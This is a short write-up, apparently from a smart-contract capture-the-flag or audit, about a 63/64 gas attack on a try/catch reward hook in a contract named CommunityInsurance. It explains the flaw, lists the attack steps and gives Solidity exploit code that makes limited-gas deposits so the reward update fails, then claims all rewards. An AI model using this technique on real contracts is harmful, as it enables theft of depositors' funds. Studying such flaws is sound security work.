### Vulnerabilities

1. The `try/catch` can be exploited using a 63/64 gas attack. If an attacker manages to make the `try` block fail with an out‑of‑gas error, the internal accumulator in `RewardDistributor` will not be updated:
```solidity
    function _update(address from, address to, uint256 value) internal override {        

        // Update rewards for the receiver if it's not a burn operation
        if (to != address(0)) {
            uint256 freeTo = balanceOf(to) - withdrawRequests[to].shares - value;
>>>          try IRewardDistributor(rewardDistributor).updateReward(to, freeTo, totalFree) {} catch {}
        }
    }
```

### Attack

1. At this point, `CommunityInsurance` is expected to be almost empty due to liquidations during the lending contracts exploit. WETH, USDC, and NISC balances are reduced to 1 wei each. This allows an attacker to receive a massive number of shares by depositing very small amounts.
2. The `deposit` function is called with a limited gas amount, causing `RewardDistributor.updateReward` to fail inside the `try` block.
3. The attacker then claims rewards. Since the reward was never updated and the attacker holds more shares than other depositors, they receive the entire reward.
4. Full attack:
```solidity
        /// INSURANCE ATTACK
        uint256[] memory deposits = new uint256[](3);
        deposits[0] = 1; 
        deposits[1] = 1;
        deposits[2] = 1;

        usdc.approve(address(communityInsurance), type(uint256).max);
        weth.approve(address(communityInsurance), type(uint256).max);
        nisc.approve(address(communityInsurance), type(uint256).max);
        for(uint256 i=0; i<22; ++i) {
            communityInsurance.deposit{gas: 70000}(deposits);
        }
        rewardDistributor.claimReward(); 
```
